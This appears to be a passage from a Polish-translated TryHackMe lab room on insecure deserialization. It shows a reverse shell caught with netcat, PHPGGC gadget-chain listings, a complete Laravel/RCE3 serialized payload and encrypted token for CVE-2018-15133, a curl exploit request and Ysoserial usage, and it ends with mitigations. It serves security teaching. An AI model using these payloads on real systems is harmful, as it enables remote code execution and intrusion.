- Teraz nadszedł czas na wykorzystanie niebezpiecznej deserializacji poprzez zdekodowanie kodu powłoki poprzez odwiedzenie adresu URL `http://MACHINE_IP/case2/?decode=[SHELLCODE]`bez generowania kodu powłoki.  
    
- Po odwiedzeniu adresu URL funkcja deserialise pliku index.php deserializuje ciąg znaków i wykonuje funkcję `__wakeup()`, co prowadzi do zdalnej powłoki. 

Terminal

```shell-session
thm@ubuntu$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from ATTACK_IP 35838 received! 
```

W kolejnych zadaniach zrozumiemy problemy, które umożliwiły atakującemu wykorzystanie luki w zabezpieczeniach, a także w jaki sposób możemy się przed nią zabezpieczyć z perspektywy bezpiecznego programisty.



Automatyzacja skryptów podczas testów penetracyjnych jest niezbędna do skutecznego identyfikowania i wykorzystywania luk w zabezpieczeniach aplikacji internetowych. W tym zadaniu przyjrzymy się jednemu z takich narzędzi, zwanemu **PHPGadge Chain (PHPGGC)**  odgrywa kluczową rolę w tym procesie, automatyzując wykrywanie luk w zabezpieczeniach deserializacji. PHPGGC, podobny do Ysoserial w ekosystemie Java, pomaga specjalistom ds. bezpieczeństwa oceniać stan bezpieczeństwa aplikacji PHP i minimalizować potencjalne zagrożenia. 

Łańcuch gadżetów PHP (PHPGGC)  

 PHPGGC to przede wszystkim narzędzie służące do generowania łańcuchów gadżetów używanych w atakach polegających na wstrzykiwaniu obiektów PHP, specjalnie dostosowane do wykorzystywania luk w zabezpieczeniach związanych z serializacją i deserializacją obiektów PHP.

**Funkcjonalność**

- **Łańcuchy gadżetów** : PHPGGC udostępnia bibliotekę łańcuchów gadżetów dla różnych frameworków i bibliotek PHP. Łańcuchy gadżetów to sekwencje obiektów i metod zaprojektowane w celu wykorzystania określonych luk w zabezpieczeniach, gdy aplikacja PHP w niebezpieczny sposób deserializuje dane dostarczone przez użytkownika.  
    
- **Generowanie ładunku** : Głównym celem PHPGGC jest ułatwienie generowania zserializowanych ładunków, które mogą aktywować te luki. Pomaga badaczom bezpieczeństwa i testerom penetracyjnym tworzyć ładunki demonstrujące wpływ luk w zabezpieczeniach deserializacji.
- **Dostosowywanie ładunku** : Użytkownicy mogą dostosowywać ładunki, określając argumenty dla funkcji lub metod zaangażowanych w łańcuch gadżetów. W ten sposób dostosowują atak w celu osiągnięcia określonych rezultatów, takich jak kodowanie.  
    

Możesz pobrać PHPGGC z [repozytorium GitHub(otwiera się w nowej karcie)](https://github.com/ambionics/phpggc)lub użyj wersji dostępnej w AttackBoxie za pośrednictwem `/opt/phpggc`katalogu. Zainstalowana wersja zawiera już kilka łańcuchów gadżetów, sekwencje obiektów PHP i wywołania metod zaprojektowane w celu wykorzystania luk deserializacji. Te łańcuchy gadżetów wykorzystują magiczne metody PHP do realizacji różnych celów ataku, takich jak zdalne wykonanie kodu.  
Aby wyświetlić listę wszystkich dostępnych łańcuchów gadżetów, możesz skorzystać z `-l`opcji w PHPGGC, która wyświetli Nazwę, Wersję, Typ i Wektor do uruchomienia konkretnego ataku. Dodatkowo, możesz filtrować łańcuchy gadżetów na podstawie ich możliwości, takich jak te ukierunkowane na konkretne frameworki PHP lub wykorzystujące określone techniki exploitów, używając opcji, `-l` po której następuje słowo kluczowe filtra (Drupal, Laravel itp.). Pozwala to wybrać odpowiedni łańcuch gadżetów dla danego scenariusza ataku, jak pokazano poniżej:

Terminal

```shell-session
thm@machine$ php phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                      VECTOR          I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           
CakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           
CakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           
CodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           
CodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    
CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           
CodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct         
```

Na przykład wynik dla `CakePHP/RCE1`oznacza, że ​​łańcuch gadżetów o nazwie „ `CakePHP/RCE1` wykorzystuje lukę RCE” w wersjach CakePHP do `3.9.6`. Luka ta umożliwia atakującym wykonywanie dowolnych poleceń na serwerze za pomocą `__destruct`metody magicznej.

Wykorzystywanie aplikacji internetowej  

Jako pentester skupiamy się na witrynie Laravel, aby wykorzystać znaną lukę w zabezpieczeniach zidentyfikowaną pod [numerem CVE-2018-15133(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)Luka w zabezpieczeniach pojawia się, gdy Laravel deserializuje (rozpakowuje) niezaufane dane z `X-XSRF-TOKEN`. Ten proces deserializacji może prowadzić do wykonania dowolnego kodu na serwerze, jeśli nie zostanie przeprowadzony w bezpieczny sposób. Szczegóły dotyczące luki w zabezpieczeniach można znaleźć w [publikacji bezpieczeństwa Laravel.(otwiera się w nowej karcie)](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30), ale skupimy się głównie na tym, jak wykorzystać łańcuchy gadżetów PHP podczas eksploatacji. Wspomnianą powyżej lukę można wykorzystać, wykorzystując trzy główne czynniki:

- **Krok 1** : Wymaga `APP_KEY`od Laravel, którego framework używa do szyfrowania tokena XSRF.
- **Krok 2** : Użyj PHPGGC do wygenerowania nieserializowanego ładunku wykonującego polecenie. To zadanie jest uważane za złożone, a narzędzie przychodzi z pomocą.
- **Krok 3** : Na koniec musimy zaszyfrować ładunek za pomocą klucza APP_KEY i wysłać żądanie POST. Zwykle różni się to w zależności od frameworka.  
    

W tym zadaniu skupimy się przede wszystkim na kroku 2 i zrozumieniu, jak PHPGGC pomoże nam jako pentesterowi. Odwiedź podatną na ataki aplikację Laravel pod adresem [http://MACHINE_IP:8089(otwiera się w nowej karcie)](http://machine_ip:8089/)Jako pentesterzy potrafimy identyfikować wersje aplikacji internetowych za pomocą wielu technik. Możesz zapoznać się z modułem [„Zbieranie informacji i skanowanie podatności”,](https://tryhackme.com/module/information-gathering-and-vulnerability-scanning)  aby dowiedzieć się więcej. Wersja aplikacji Laravel to 5.6.29. 

![panel aplikacji laravel](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png)

Teraz przejdziemy do szczegółowej, krok po kroku, eksploatacji:

- W pierwszym kroku zdobędziemy klucz APP_KEY za pomocą dowolnego wektora ataku, takiego jak socjotechnika. Możesz go uzyskać, `APP_KEY`odwiedzając stronę[http://IP_MASZYNY:8089/get-key(otwiera się w nowej karcie)](http://machine_ip:8089/get-key)Dla Twojej wygody na tej stronie znajdziesz również pierwszy ładunek zawierający polecenie **whoami** .  
    
- W drugim kroku musimy zidentyfikować ładunek, którego możemy użyć.  
    

Terminal

```shell-session
thm@machine$ php phpggc -l Laravel

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR    
Laravel/RCE1          5.4.27            rce              __destruct
Laravel/RCE2          5.5.39            rce              __destruct
Laravel/RCE3          5.5.39            rce              __destruct
Laravel/RCE4          5.5.39            rce              __destruct

```

﻿Następnie możemy wygenerować ładunek za pomocą różnych gadżetów. Każdy gadżet ma swoje znaczenie i wykorzystuje różne klasy w procesie deserializacji. W tym przykładzie użyjemy RCE3 i możemy wygenerować ładunek, wpisując polecenie  `php phpggc -b Laravel/RCE3 system whoami` dla ładunku zakodowanego w standardzie Base64. Poniżej przedstawiono niezakodowany ładunek:  

Terminal

```shell-session
thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}

```

Rozkład ładunku  

- `Illuminate\Broadcasting\PendingBroadcast`:Ta klasa obsługuje rozgłaszanie zdarzeń w Laravel. W tym przypadku jest to przede wszystkim nośnik do przenoszenia zagnieżdżonego złośliwego obiektu.
- `Illuminate\Notifications\ChannelManager`: Ten obiekt zarządza kanałami powiadomień. Manipulujemy nim, aby wstrzykiwać wykonywanie dowolnego kodu za pośrednictwem jego właściwości,  `*app`, które zazwyczaj odwołują się do kontenera usługi aplikacji. Używamy go niewłaściwie do przechowywania naszego polecenia `whoami`. Zmodyfikowaliśmy również właściwości `*defaultChannel`i `*customCreators`, które są zniekształcone, aby stworzyć scenariusz, w którym wywoływana jest funkcja PHP `assert`, wykonująca dowolny przekazany jej kod.

Jak już wiemy, Laravel początkowo wykorzystywał **zaszyfrowane** i **zserializowane** pliki cookie do bezpiecznego przechowywania danych sesji i tokenów CSRF, stosując tę ​​samą metodologię dla obu. Jeśli odwiedzisz podatną na atak aplikację, zobaczysz zaszyfrowane i zserializowane pliki cookie, jak pokazano poniżej:

![zaszyfrowany plik cookie Laravel](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png)  

Podstawowym założeniem było zapobiegnięcie manipulacji danymi przez osoby trzecie, jednak nie zdawano sobie sprawy, że nawet tak silny mechanizm bezpieczeństwa może zostać naruszony poprzez niezabezpieczoną serializację.  

Teraz, gdy mamy już `APP_KEY`ładunek, czas na utworzenie zaszyfrowanego plikuCSRFToken. Na potrzeby tego pokoju przygotowaliśmy skrypt PHP, który przyjmuje jako argumenty APP_KEY i payload i zwraca zaszyfrowany token. Link jest dostępny pod adresem [http://MACHINE_IP:8089/cve.php?app_key=xx&payload=xxx(otwiera się w nowej karcie)](http://machine_ip:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D)Dla Twojej wygody ,  ten adres URL zawiera już zakodowany klucz i pierwszy ładunek z poleceniem **whoami** .  Zrozumienie mechanizmu szyfrowania dla frameworków takich jak Laravel i WordPress jest prostym zadaniem, ale obecnie wykracza poza zakres tego tematu.

Podczas testów penetracyjnych frameworków internetowych, takich jak Yii, CakePHP i Laravel, kluczowe jest zrozumienie, że każdy z nich ma unikalne mechanizmy routingu i szyfrowania, mimo że wszystkie są zbudowane w PHP. Frameworki te są projektowane z wykorzystaniem różnych architektur i implementacji zabezpieczeń, co oznacza, że ​​luka bezpieczeństwa, taka jak RCE3 w Laravel, wykorzystująca kontener usług i zachowanie serializacji Laravel, niekoniecznie będzie dotyczyć WordPressa ani innych systemów opartych na PHP. Na przykład WordPress ma inną strukturę i nie korzysta ze specyficznych klas ani metod Laravel, więc exploit dostosowany do architektury Laravel nie zadziała bezpośrednio w WordPressie.  

Mając już zaszyfrowany token, możemy wysłać proste żądanie POST z użyciem tokenu CSRF, jak pokazano poniżej, aby wykonać polecenie. Wynik zapytania pojawi się na początku odpowiedzi `cURL`.

Terminal

```shell-session
thm@machine$curl MACHINE_IP:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0
<!DOCTYPE html><!--
100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k
curl: (23) Failed writing body (947 != 7240)

```

Ysoserial dla Javy

Ysoserial to powszechnie znane narzędzie do eksploitacji, stworzone specjalnie do testowania bezpieczeństwa aplikacji Java pod kątem luk w serializacji. Pomaga generować ładunki wykorzystujące te luki, co czyni je niezbędnym narzędziem dla atakujących i testerów penetracyjnych, którzy chcą oceniać i wykorzystywać aplikacje wykorzystujące serializację Java.

Aby użyć Ysoserial, atakujący zazwyczaj generuje ładunek za pomocą polecenia takiego jak `java -jar ysoserial.jar [payload type] '[command to execute]'`, gdzie `[payload type]`jest typem exploita, a `[command to execute]`jest dowolnym poleceniem, które chce uruchomić w systemie docelowym. Na przykład użycie `CommonsCollections1`typu ładunku może wyglądać następująco: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. To polecenie generuje zserializowany obiekt, który wykona określone polecenie po deserializacji przez podatną aplikację. Ysoserial jest dostępny do [pobrania.(otwiera się w nowej karcie)](https://github.com/frohoff/ysoserial)na GitHubie.


Ograniczanie ryzyka związanego z niebezpieczną deserializacją ma kluczowe znaczenie dla zapewnienia bezpieczeństwa aplikacji internetowej. Wdrażając skuteczne środki obrony, organizacje mogą znacząco zmniejszyć prawdopodobieństwo wykorzystania luk i złagodzić skutki.


Potencjalne szkody. Omówimy to z perspektywy zespołu red/pentestera i bezpiecznego kodu . 

Perspektywa Red Teamera/Pentestera

Analiza bazy kodu : Przeprowadź kompleksowy przegląd mechanizmów serializacji aplikacji. Zidentyfikuj potencjalne punkty deserializacji i serializacji w całej bazie kodu.
Identyfikacja podatności : Użyjanaliza statycznaNarzędzia do wykrywania luk w zabezpieczeniach deserializacji. Szukaj nieprawidłowej walidacji danych wejściowych, niebezpiecznych bibliotek i nieaktualnych zależności.
Rozmycie ianaliza dynamiczna:Zastosuj techniki fuzzingu, aby generować nieprawidłowe lub nieoczekiwane dane wejściowe. Użyj narzędzi do analizy dynamicznej, aby monitorować zachowanie aplikacji w czasie wykonywania.
Ocena obsługi błędów : Oceń, jak aplikacja obsługuje błędy podczas deserializacji. Poszukaj potencjalnych komunikatów o błędach lub śladów stosu, które ujawniają szczegóły systemu.
Perspektywa Bezpiecznego Kodera

Unikaj niebezpiecznych formatów serializacji : Unikaj używania z natury niebezpiecznych formatów serializacji, takich jak serializacja Java. Wybieraj bezpieczniejsze alternatywy, takie jak:JSONLubXMLz solidnymi mechanizmami walidacji.
Unikaj poleceń eval i exec : Unikaj używania funkcji eval()i exec(), ponieważ mogą one wykonywać dowolny kod i stwarzać poważne zagrożenie bezpieczeństwa.
Walidacja danych wejściowych i kodowanie danych wyjściowych : Wdrożenie rygorystycznej walidacji danych wejściowych w celu zapewnienia akceptacji wyłącznie oczekiwanych danych. Zastosuj techniki kodowania danych wyjściowych w celu oczyszczenia danych przed serializacją.
Bezpieczne praktyki kodowania : Stosuj bezpieczne praktyki kodowania zalecane przez standardy i wytyczne bezpieczeństwa. Stosuj zasady takie jak minimalne uprawnienia, głęboka ochrona i domyślne zabezpieczenia przed awariami.
Przestrzeganie wytycznych : Ustalone bezpieczne wytyczne dotyczące kodowania, specyficzne dla języka programowania lub struktury.


Podsumowując, konferencja poświęcona niebezpiecznej serializacji pozwoliła nam dogłębnie zrozumieć tę krytyczną lukę w zabezpieczeniach i jej wpływ na aplikacje internetowe. Rozpoczęliśmy od omówienia podstawowych koncepcji serializacji i niebezpiecznej serializacji. Następnie zagłębiliśmy się w różne formaty serializacji używane w różnych językach programowania, aby zrozumieć zróżnicowane przejawy tej luki.

Następnie nauczyliśmy się identyfikować niebezpieczne luki w serializacji w aplikacjach. Poprzez ćwiczenia praktyczne zgłębialiśmy techniki eksploatacji, w tym aktualizację właściwości i wstrzykiwanie obiektów, aby zrozumieć wieloaspektową naturę ataków prowadzących do zdalnego wykonania kodu.

Na koniec omówiliśmy środki zaradcze zabezpieczające aplikacje przed tymi lukami oraz przeanalizowaliśmy skrypty automatyzacji usprawniające proces identyfikacji i naprawy. Ta sala wyposażyła Cię w wiedzę niezbędną do identyfikowania, wykorzystywania i łagodzenia luk w zabezpieczeniach serializacji, wzmacniając ogólną stabilność bezpieczeństwa.

Daj nam znać, co myślisz o tym pokoju na naszym  Discordzie (otwiera się w nowej karcie)kanał lub  konto X(otwiera się w nowej karcie)Do zobaczenia.